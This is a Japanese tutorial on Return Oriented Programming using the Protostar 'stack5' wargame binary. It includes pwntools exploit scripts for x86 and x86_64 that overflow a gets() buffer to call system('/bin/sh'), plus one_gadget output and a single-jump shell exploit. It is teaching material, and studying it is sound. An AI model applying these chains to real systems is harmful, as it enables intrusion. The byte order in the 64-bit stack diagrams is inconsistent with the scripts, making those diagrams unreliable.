
## はじめに
Return Oriented Programming（ROP）とは、とある関数のスタックフレームの直後を上書きすることで、改竄なコールスタックを作る技術である。行うと、引数を自由に用意することが出来、自由な関数を呼び出すことが出来ます。それに加え、メモリに既に存在している命令を再利用することで、ASLRによるスタック領域の位置のランダム化を迂回できるという利点もあるため、ROPはかなり強い攻撃ですね。

さて、アーキテクチャによりスタック領域にあるコールスタックの形が変わるので、参照のため、以下x86とx86_64のスタック構造を記録しました。

これ以降、Protostar2の「stack5」問題を例問として使っていきます。
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

## 32ビット上

```
#!/usr/bin/env python2
from pwn import *

p = process("./stack5")

pop_ebx = 0x0804901e
str_binsh = 0xf7f68b35
addr_system = 0xf7e295a0
addr_exit = 0xf7e1c690

payload = "a" * 0x48 + p32(0x0)
payload += p32(addr_system) + p32(pop_ebx) + p32(str_binsh) # system("/bin/sh")
payload += p32(addr_exit) + p32(pop_ebx) + p32(0x00000000)  # exit(0)

p.sendline(payload)
p.interactive()
p.close()
```
```
+------------+--+--+--+--+--+--+
| 0xffffd588 |   00 00 00 00   |          // ebp
+------------+--+--+--+--+--+--+
| 0xffffd58c |   a0 95 e2 f7   | system() // 関数１
| 0xffffd590 |   1e 90 04 08   | pop ebx  // ESPを調整する
| 0xffffd594 |   35 8b f6 f7   | /bin/sh  // 第一引数
+------------+--+--+--+--+--+--+
| 0xffffd598 |   90 c6 e1 f7   | exit()   // 関数２
| 0xffffd59c |   1e 90 04 08   | pop ebx  // ESPを調整する
| 0xffffd5a0 |   00 00 00 00   | 0        // 第一引数
+------------+--+--+--+--+--+--+
```

## 64ビット上

```
#!/usr/bin/env python2
from pwn import *

p = process("./stack5")

libc_base = 0x7ffff7dd7000

pop_rdi = libc_base + 0x26542
str_binsh = libc_base + 0x1afb84
addr_system = libc_base + 0x52fd0
addr_exit = libc_base + 0x473c0

payload = "a" * 0x40 + p64(0x0)
payload += p64(pop_rdi) + p64(str_binsh) + p64(addr_system) # system("/bin/sh")
payload += p64(pop_rdi) + p64(0x00000000) + p64(addr_exit)  # exit(0)

p.sendline(payload)
p.interactive()
p.close()
```
```
+----------------+--+--+--+--+--+--+--+--+--+--+
| 0x7fffffffe440 |   00 00 00 00 00 00 00 00   |          // rbp
+----------------+--+--+--+--+--+--+--+--+--+--+
| 0x7fffffffe448 |   f7 df d5 42 00 00 ff 7f   | pop rdi  // RDIを用意する
| 0x7fffffffe450 |   f7 f8 6b 84 00 00 ff 7f   | /bin/sh  // RDIに"/bin/sh"のポインタ
| 0x7fffffffe458 |   f7 e2 9f d0 00 00 ff 7f   | system() // systemを呼び出す
+----------------+--+--+--+--+--+--+--+--+--+--+
| 0x7fffffffe460 |   f7 df d5 42 00 00 ff 7f   | pop rdi  // RDIを用意する
| 0x7fffffffe468 |   00 00 00 00 00 00 00 00   | 0        // RDIに0を
| 0x7fffffffe470 |   f7 e1 e3 c0 00 00 ff 7f   | exit()   // exitを呼び出す
+----------------+--+--+--+--+--+--+--+--+--+--+
```

基本的に64ビットではRDIが第一、RSIが第二、RDXが第三引数です。３引数以上を求める関数は実際に少ないと思いますが、第４引数からはr8~r15が使われるらしいです（試したことはない）

## ARM
// TODO

## one-gadget

たまには、コールスタックを奪うことが出来ず、一つのジャンプだけでシェルをスポーンしなければいけない場合があります。そんなときに、one-gadgetという技術を使いましょう。名前通りに、one-gadgetとは、関数のようにただ一回callまたjmpするだけで/bin/shを実行してくれる命令列（すなわちROPガジェット）のことです。特にLIBC内にはこういうone-gadgetが複数存在します。

さて、与えるLIBCを探してone-gadgetの位置を見つけ出してくれるrubyスクリプト「[one_gadget](https://github.com/david942j/one_gadget)」で私のlibcを検索し、見つけ出したone-gadgetを使ってみましょう。
```
$ one_gadget /lib/x86_64-linux-gnu/libc.so.6
0xe237f execve("/bin/sh", rcx, [rbp-0x70])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe2383 execve("/bin/sh", rcx, rdx)
constraints:
  [rcx] == NULL || rcx == NULL
  [rdx] == NULL || rdx == NULL

0xe2386 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0x106ef8 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
$
```
```
#!/usr/bin/env python2
from pwn import *

p = process("./stack5")

libc_base = 0x7ffff7dd7000
one_gadget = libc_base + 0x106ef8

payload = "a" * 0x40 + p64(0x0)
payload += p64(one_gadget)

p.sendline(payload)
p.interactive()
p.close()
```
```
+----------------+--+--+--+--+--+--+--+--+--+--+
| 0x7fffffffe440 |   00 00 00 00 00 00 00 00   | // rbp
+----------------+--+--+--+--+--+--+--+--+--+--+
| 0x7fffffffe448 |   f7 ed de f8 00 00 ff f7   | // one-gadget
+----------------+--+--+--+--+--+--+--+--+--+--+
```
